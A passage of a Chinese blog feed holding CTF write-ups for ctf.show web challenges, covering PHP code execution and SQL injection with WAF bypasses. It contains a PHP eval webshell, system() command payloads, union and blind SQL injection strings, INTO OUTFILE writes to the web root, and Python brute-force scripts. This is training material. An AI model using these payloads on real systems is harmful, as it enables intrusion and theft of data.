class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$allow</span> = <span class="hljs-keyword">array</span>();<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">36</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">0x36d</span>; <span class="hljs-variable">$i</span>++) { <br>    <span class="hljs-title function_ invoke__">array_push</span>(<span class="hljs-variable">$allow</span>, <span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1</span>,<span class="hljs-variable">$i</span>));<br>}<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'n'</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'n'</span>], <span class="hljs-variable">$allow</span>)){<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'n'</span>], <span class="hljs-variable">$_POST</span>[<span class="hljs-string">'content'</span>]);<br>}<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></tbody></table></figure><p>判断超全局变量n是否在数组allow中，数组allow来自第三行，36-877中随机数，第七行将content的数据写入n中：</p><p>写入一个webshell</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">n=<span class="hljs-number">38</span>.php<br>content=<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'she'</span>]); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure><p>访问shell</p><figure class="highlight clean"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">?she=<span class="hljs-keyword">system</span>(<span class="hljs-string">'tac flag36d.php'</span>);<br></code></pre></td></tr></tbody></table></figure><p>in_array函数的漏洞：<br><img src="https://img-blog.csdnimg.cn/20210125215956454.png" alt="在这里插入图片描述"></p><p>因为没有设置第三个参数，所以默认是弱类型比较，碰运气试数字.php，比如1.php，运气好就可以写进马。</p><h3 id="WEB100"><a href="#WEB100" class="headerlink" title="WEB100"></a>WEB100</h3><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$ctfshow</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ctfshow</span>();<br><span class="hljs-variable">$v1</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'v1'</span>];<br><span class="hljs-variable">$v2</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'v2'</span>];<br><span class="hljs-variable">$v3</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'v3'</span>];<br><span class="hljs-variable">$v0</span>=<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v1</span>) <span class="hljs-keyword">and</span> <span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v2</span>) <span class="hljs-keyword">and</span> <span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v3</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$v0</span>){<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">"/\;/"</span>, <span class="hljs-variable">$v2</span>)){<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">"/\;/"</span>, <span class="hljs-variable">$v3</span>)){<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-string">"<span class="hljs-subst">$v2</span>('ctfshow')<span class="hljs-subst">$v3</span>"</span>);<br>        }<br>    }  <br>}<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure><p> 在PHP中，&amp;&amp;与and都表示逻辑与，||与or都表示逻辑或，并且它们都是短路运算符。而它们的区别在于运算的优先级不同。</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$t1</span>=<span class="hljs-literal">true</span> <span class="hljs-keyword">and</span> <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$t2</span>=<span class="hljs-literal">true</span> &amp;&amp; <span class="hljs-literal">false</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$t1</span>,<span class="hljs-variable">$t2</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure><p> 在上面的代码中t1的值为true，t2的值为false。因为运算符and、=、&amp;&amp;的优先级为&amp;&amp;&gt;=&gt;and，所以在执行第一行时，会先将true赋值给t1，false被忽略。而第二行代码会先进行&amp;&amp;运算，然后将运算的结果false，赋值给t2。<br>    同样对于||和or。运算符or、=、||的优先级为||&gt;=&gt;or。下面代码运行后，t1的值为false，$2的值为true。</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$t1</span>=<span class="hljs-literal">false</span> <span class="hljs-keyword">or</span> <span class="hljs-literal">true</span>;<br><span class="hljs-variable">$t2</span>=<span class="hljs-literal">false</span> || <span class="hljs-literal">true</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$t1</span>,<span class="hljs-variable">$t2</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure><p>所以只要让v1是is_numeric就可以了。</p><figure class="highlight armasm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs armasm">?<span class="hljs-built_in">v1</span><span class="hljs-number">=1</span>&amp;<span class="hljs-built_in">v2</span><span class="hljs-symbol">=var_dump</span>($ctfshow)<span class="hljs-comment">/*&amp;v3=*/</span><span class="hljs-comment">;</span><br>?<span class="hljs-built_in">v1</span><span class="hljs-number">=1</span>&amp;<span class="hljs-built_in">v2</span><span class="hljs-symbol">=system</span>(<span class="hljs-string">"ls"</span>)<span class="hljs-comment">/*&amp;v3=*/</span><span class="hljs-comment">;</span><br></code></pre></td></tr></tbody></table></figure><h3 id="WEB102"><a href="#WEB102" class="headerlink" title="WEB102"></a>WEB102</h3><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$v1</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">'v1'</span>];<br><span class="hljs-variable">$v2</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'v2'</span>];<br><span class="hljs-variable">$v3</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'v3'</span>];<br><span class="hljs-variable">$v4</span> = <span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v2</span>) <span class="hljs-keyword">and</span> <span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v3</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$v4</span>){<br>    <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$v2</span>,<span class="hljs-number">2</span>);<br>    <span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$v1</span>,<span class="hljs-variable">$s</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$v3</span>,<span class="hljs-variable">$str</span>);<br>}<br><span class="hljs-keyword">else</span>{<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">'hacker'</span>);<br>}<br></code></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf_show</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入</title>
    <link href="/posts/e73517db/"/>
    <url>/posts/e73517db/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="CTF-SHOW"><a href="#CTF-SHOW" class="headerlink" title="CTF_SHOW"></a>CTF_SHOW</h2><p>题目来自于CTF_SHOW的 web入门</p><h3 id="WEB173"><a href="#WEB173" class="headerlink" title="WEB173"></a><a href="">WEB173</a></h3><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>拼接sql语句查找指定ID用户<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">"select id,username,password from ctfshow_user3 where username !='flag' and id = '"</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'id'</span>].<span class="hljs-string">"' limit 1;"</span>;<br><br>/检查结果是否有flag<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">'/flag/i'</span>, json_encode(<span class="hljs-variable">$ret</span>))){<br>      <span class="hljs-variable">$ret</span>[<span class="hljs-string">'msg'</span>]=<span class="hljs-string">'查询成功'</span>;<br>    }<br></code></pre></td></tr></tbody></table></figure><p>PY:</p><figure class="highlight n1ql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">0' union <span class="hljs-keyword">select</span> id,<span class="hljs-built_in">replace</span>(username,<span class="hljs-string">'f'</span>,<span class="hljs-string">'g'</span>),<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> ctfshow_user3 <span class="hljs-keyword">where</span> username = <span class="hljs-string">'flag</span><br></code></pre></td></tr></tbody></table></figure><p>KEY:</p><p>在 SQL 中，<code>REPLACE()</code> 是一个字符串函数，用于替换字符串中的指定子字符串。</p><p><code>REPLACE()</code> 函数的语法如下：</p><figure class="highlight reasonml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-constructor">REPLACE(<span class="hljs-params">string</span>, <span class="hljs-params">old_substring</span>, <span class="hljs-params">new_substring</span>)</span><br></code></pre></td></tr></tbody></table></figure><p>其中：</p><ul><li><code>string</code> 是要进行替换操作的源字符串。</li><li><code>old_substring</code> 是要被替换的子字符串。</li><li><code>new_substring</code> 是替换后的子字符串。</li></ul><p><code>REPLACE()</code> 函数会在 <code>string</code> 字符串中查找所有出现的 <code>old_substring</code> 子字符串，并将其替换为 <code>new_substring</code>。如果 <code>string</code> 中存在多个 <code>old_substring</code> 子字符串，所有的 <code>old_substring</code> 都会被替换成 <code>new_substring</code>。</p><h3 id="WEB174"><a href="#WEB174" class="headerlink" title="WEB174"></a>WEB174</h3><figure class="highlight arcade"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">'/flag|[0-9]/i'</span>, json_encode(<span class="hljs-symbol">$ret</span>))){<br>      <span class="hljs-symbol">$ret</span>[<span class="hljs-string">'msg'</span>]=<span class="hljs-string">'查询成功'</span>;<br>    }<br></code></pre></td></tr></tbody></table></figure><p>因为过滤了数字，因此可以利用下面的方式绕过，但是下面这个分得清flag原本的字母和数字吗？也许可以这样：replace(password,0,’numa’)</p><p>PY:</p><figure class="highlight pgsql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(<span class="hljs-keyword">password</span>,<span class="hljs-number">0</span>,<span class="hljs-string">'g'</span>),<span class="hljs-number">1</span>,<span class="hljs-string">'h'</span>),<span class="hljs-number">2</span>,<span class="hljs-string">'i'</span>),<span class="hljs-number">3</span>,<span class="hljs-string">'j'</span>),<span class="hljs-number">4</span>,<span class="hljs-string">'k'</span>),<span class="hljs-number">5</span>,<span class="hljs-string">'l'</span>),<span class="hljs-number">6</span>,<span class="hljs-string">'m'</span>),<span class="hljs-number">7</span>,<span class="hljs-string">'n'</span>),<span class="hljs-number">8</span>,<span class="hljs-string">'o'</span>),<span class="hljs-number">9</span>,<span class="hljs-string">'p'</span>)<br></code></pre></td></tr></tbody></table></figure><h3 id="WEB175"><a href="#WEB175" class="headerlink" title="WEB175"></a>WEB175</h3><figure class="highlight reasonml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-keyword">if</span>(!preg<span class="hljs-constructor">_match('<span class="hljs-operator">/</span>[\<span class="hljs-params">x00</span>-\<span class="hljs-params">x7f</span>]<span class="hljs-operator">/</span><span class="hljs-params">i</span>', <span class="hljs-params">json_encode</span>($<span class="hljs-params">ret</span>)</span>)){<br>      $ret<span class="hljs-literal">['<span class="hljs-identifier">msg</span>']</span>='查询成功';<br>    }<br></code></pre></td></tr></tbody></table></figure><p><code>/[\x00-\x7f]/i</code>：这是一个正则表达式模式，用于匹配 ASCII 字符范围内的字符。<code>\x00-\x7f</code> 表示 ASCII 字符的十六进制范围，即从 0x00（空字符）到 0x7f（DEL 字符）。</p><p>PY:</p><p>盲注是可行的，其次就是将查询结果写到文件中，然后访问文件即可，在没有多余的选择下，可以尝试一下：</p><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">-<span class="hljs-number">1</span><span class="hljs-string">' union select username,password from ctfshow_user5 into outfile '</span><span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span><span class="hljs-number">1</span>.txt<span class="hljs-string">'--+</span><br></code></pre></td></tr></tbody></table></figure><h3 id="WEB177"><a href="#WEB177" class="headerlink" title="WEB177"></a>WEB177</h3><figure class="highlight n1ql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">$sql = "<span class="hljs-keyword">select</span> id,username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> ctfshow_user <span class="hljs-keyword">where</span> username !=<span class="hljs-string">'flag'</span> <span class="hljs-keyword">and</span> id = <span class="hljs-string">'".$_GET['</span>id<span class="hljs-string">']."'</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>;";<br></code></pre></td></tr></tbody></table></figure><p>此处应该是过滤了空格</p><figure class="highlight rust"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs rust">-<span class="hljs-number">1</span>'<span class="hljs-comment">/**/</span>or<span class="hljs-comment">/**/</span>username=<span class="hljs-symbol">'flag</span><br></code></pre></td></tr></tbody></table></figure><h3 id="WEB178"><a href="#WEB178" class="headerlink" title="WEB178"></a>WEB178</h3><p>过滤了空格和*等符号</p><figure class="highlight haml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs haml"><span class="hljs-tag">%<span class="hljs-selector-tag">09</span></span>：水平制表符，Tab<br><span class="hljs-tag">%<span class="hljs-selector-tag">0b</span></span>：垂直制表符 Enter<br><span class="hljs-tag">%<span class="hljs-selector-tag">23</span></span>：#<br></code></pre></td></tr></tbody></table></figure><p>可以用回车和tab代替空格</p><p>PY:</p><figure class="highlight llvm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">-1</span>'<span class="hljs-variable">%09</span>union<span class="hljs-variable">%09</span><span class="hljs-keyword">select</span><span class="hljs-variable">%091</span><span class="hljs-punctuation">,</span>username<span class="hljs-punctuation">,</span>password<span class="hljs-variable">%09</span>from<span class="hljs-variable">%09</span>ctfshow_user<span class="hljs-variable">%23</span><br>'<span class="hljs-keyword">or</span>'<span class="hljs-number">1</span>'<span class="hljs-operator">=</span>'<span class="hljs-number">1</span>'<span class="hljs-variable">%23</span><br></code></pre></td></tr></tbody></table></figure><p>题目难点就是找到过滤的点</p><h3 id="WEB179"><a href="#WEB179" class="headerlink" title="WEB179"></a>WEB179</h3><p>貌似过滤了空格，*,%0b,%09,但是%23，%0C可用：</p><figure class="highlight xquery"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xquery"><span class="hljs-string">'or'</span><span class="hljs-number">1</span><span class="hljs-string">'='</span><span class="hljs-number">1</span><span class="hljs-string">'%23</span><br><span class="hljs-string">-1'</span><span class="hljs-keyword">union</span><span class="hljs-meta">%0cselect</span><span class="hljs-meta">%0c1</span>,<span class="hljs-number">2</span>,password<span class="hljs-meta">%0cfrom</span><span class="hljs-meta">%0cctfshow_user</span><span class="hljs-meta">%23</span><br></code></pre></td></tr></tbody></table></figure><h3 id="WEB180-182"><a href="#WEB180-182" class="headerlink" title="WEB180-182"></a>WEB180-182</h3><p>过滤了大部分内容，但是%0c可用，同时我发现在注释上，–+的空格可用用%01-%1f其中大部分来代替，但是其不能代替空格使用</p><figure class="highlight llvm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">-1</span>'union<span class="hljs-variable">%0</span>cselect<span class="hljs-variable">%0</span><span class="hljs-keyword">c</span><span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span><span class="hljs-number">3</span>--<span class="hljs-variable">%02</span><br>'<span class="hljs-keyword">or</span>'<span class="hljs-number">1</span>'<span class="hljs-operator">=</span>'<span class="hljs-number">1</span>'--<span class="hljs-variable">%0</span><span class="hljs-keyword">c</span><br><br><span class="hljs-number">-1</span>'<span class="hljs-variable">%0</span>cor<span class="hljs-variable">%0</span>cusername<span class="hljs-variable">%0</span>clike<span class="hljs-variable">%0</span><span class="hljs-keyword">c</span>'flag<br><span class="hljs-number">-1</span>'<span class="hljs-variable">%0</span>cor<span class="hljs-variable">%0</span>cpassword<span class="hljs-variable">%0</span>clike<span class="hljs-variable">%0</span><span class="hljs-keyword">c</span>'ctf%<br></code></pre></td></tr></tbody></table></figure><p>PY4，5利用了SQL中的LIKE关键词：</p><figure class="highlight n1ql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> id,username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> ctfshow_user <span class="hljs-keyword">where</span> username !=<span class="hljs-string">'flag'</span> <span class="hljs-keyword">and</span> id = <span class="hljs-string">'-1'</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">like</span> <span class="hljs-string">'ctf%'</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>;<br></code></pre></td></tr></tbody></table></figure><h4 id="WEB181"><a href="#WEB181" class="headerlink" title="WEB181"></a>WEB181</h4><figure class="highlight delphi"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs delphi">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span><span class="hljs-params">($str)</span><span class="hljs-comment">{</span></span><br><span class="hljs-comment"><span class="hljs-function">    return preg_match('/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select/i', $str);</span></span><br><span class="hljs-comment"><span class="hljs-function">  }</span></span><br><span class="hljs-function"></span><br><span class="hljs-function">空格 <span class="hljs-params">(<span class="hljs-string">' '</span>)</span></span><br><span class="hljs-function">星号 <span class="hljs-params">(<span class="hljs-string">'*'</span>)</span></span><br><span class="hljs-function">制表符 <span class="hljs-params">(<span class="hljs-string">'\x09'</span>)</span></span><br><span class="hljs-function">换行 <span class="hljs-params">(<span class="hljs-string">'\x0a'</span>)</span></span><br><span class="hljs-function">垂直制表符 <span class="hljs-params">(<span class="hljs-string">'\x0b'</span>)</span></span><br><span class="hljs-function">换页 <span class="hljs-params">(<span class="hljs-string">'\x0c'</span>)</span></span><br><span class="hljs-function">空字符 <span class="hljs-params">(<span class="hljs-string">'\x00'</span>)</span></span><br><span class="hljs-function">回车 <span class="hljs-params">(<span class="hljs-string">'\x0d'</span>)</span></span><br><span class="hljs-function">非断行空格 <span class="hljs-params">(<span class="hljs-string">'\xa0'</span>)</span></span><br><span class="hljs-function">井号 <span class="hljs-params">(<span class="hljs-string">'\x23'</span>)</span></span><br><span class="hljs-function"># 字符</span><br><span class="hljs-function"><span class="hljs-title">file</span> 字符串</span><br><span class="hljs-function"><span class="hljs-title">into</span> 字符串</span><br><span class="hljs-function"><span class="hljs-title">select</span> 字符串</span><br></code></pre></td></tr></tbody></table></figure><p>可以看到%0c依旧可用</p><h4 id="WEB182"><a href="#WEB182" class="headerlink" title="WEB182"></a>WEB182</h4><figure class="highlight reasonml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-keyword">function</span> waf($str){<br>   return preg<span class="hljs-constructor">_match('<span class="hljs-operator">/</span> |\<span class="hljs-operator">*</span>|\<span class="hljs-params">x09</span>|\<span class="hljs-params">x0a</span>|\<span class="hljs-params">x0b</span>|\<span class="hljs-params">x0c</span>|\<span class="hljs-params">x00</span>|\<span class="hljs-params">x0d</span>|\<span class="hljs-params">xa0</span>|\<span class="hljs-params">x23</span>|\#|<span class="hljs-params">file</span>|<span class="hljs-params">into</span>|<span class="hljs-params">select</span>|<span class="hljs-params">flag</span><span class="hljs-operator">/</span><span class="hljs-params">i</span>', $<span class="hljs-params">str</span>)</span>;<br> }<br></code></pre></td></tr></tbody></table></figure><h3 id="WEB183"><a href="#WEB183" class="headerlink" title="WEB183"></a>WEB183</h3><p>select count(pass) from ctfshow_user where(substr(pass,45,1))regexp(‘}’)</p><figure class="highlight fortran"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs fortran"><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">count</span>(<span class="hljs-keyword">pass</span>)：表示要选择计数（数量）的列是 <span class="hljs-keyword">pass</span> 列。<span class="hljs-built_in">count</span>() 是一个聚合函数，用于计算指定列中非空值的数量。<br>FROM ctfshow_user：表示要从名为 ctfshow_user 的表进行查询。这是指定要查询的表名。<br><span class="hljs-keyword">WHERE</span> (substr(<span class="hljs-keyword">pass</span>, <span class="hljs-number">45</span>, <span class="hljs-number">1</span>)) REGEXP <span class="hljs-string">'}'</span>：表示查询的条件。substr(<span class="hljs-keyword">pass</span>, <span class="hljs-number">45</span>, <span class="hljs-number">1</span>) 是一个字符串函数，用于提取 <span class="hljs-keyword">pass</span> 列中从第 <span class="hljs-number">45</span> 个字符开始的 <span class="hljs-number">1</span> 个字符。然后，使用 REGEXP 运算符与正则表达式 <span class="hljs-string">'}'</span> 进行匹配。REGEXP 是一个用于正则表达式匹配的操作符。<br></code></pre></td></tr></tbody></table></figure><p>PY:</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">'http://57496c50-1b0d-40de-ac22-501e93a1ddbd.chall.ctf.show/select-waf.php'</span><br>flagstr = <span class="hljs-string">r"{flqazwsxedcrvtgbyhnujmikolp-0123456789}"</span><br>res = <span class="hljs-string">""</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">46</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> flagstr:<br>        data = {<br>            <span class="hljs-string">'tableName'</span>: <span class="hljs-string">f"(ctfshow_user)where(substr(pass,<span class="hljs-subst">{i}</span>,1))regexp('<span class="hljs-subst">{j}</span>')"</span><br>        }<br>        r = requests.post(url, data=data)<br>        <span class="hljs-keyword">if</span> r.text.find(<span class="hljs-string">"$user_count = 1;"</span>) &gt; <span class="hljs-number">0</span>:<br>            res += j<br>            <span class="hljs-built_in">print</span>(res)<br>            <span class="hljs-keyword">break</span><br><br></code></pre></td></tr></tbody></table></figure><h3 id="WEB184"><a href="#WEB184" class="headerlink" title="WEB184"></a>WEB184</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br>flagstr = <span class="hljs-string">'{abcdefghijklmnopqrstuvwxyz-0123456789}'</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">str2hex</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):<br>        a = <span class="hljs-string">""</span><br>        <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>:<br>                a += <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(x))<br>        <span class="hljs-keyword">return</span> a.replace(<span class="hljs-string">"0x"</span>,<span class="hljs-string">""</span>)<br>        flag = <span class="hljs-string">''</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">40</span>):<br>            <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> flagstr:<br>                data = {<br>                    <span class="hljs-string">"tableName"</span>:<span class="hljs-string">"ctfshow_user group by pass having pass regexp(0x63746673686f77{})"</span>.<span class="hljs-built_in">format</span>(str2hex(flag+x))<br>                }<br>                response = requests.post(url,data=data)<br>                time.sleep(<span class="hljs-number">0.3</span>)<br>                <span class="hljs-keyword">if</span> response.text.find(<span class="hljs-string">"user_count = 1;"</span>)&gt;<span class="hljs-number">0</span>:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">"{} is right"</span>.<span class="hljs-built_in">format</span>(x))<br>                    flag+=x<br>                    <span class="hljs-keyword">break</span><br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">"{} is wrong"</span>.<span class="hljs-built_in">format</span>(x))<br>                    <span class="hljs-keyword">continue</span><br>            <span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></tbody></table></figure><h3 id="WEB188"><a href="#WEB188" class="headerlink" title="WEB188"></a>WEB188</h3><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk"> <span class="hljs-regexp">//</span>拼接sql语句查找指定ID用户<br> <span class="hljs-variable">$sql</span> = <span class="hljs-string">"select pass from ctfshow_user where username = {$username}"</span>;<br> <br><span class="hljs-regexp">//</span>密码判断<br> <span 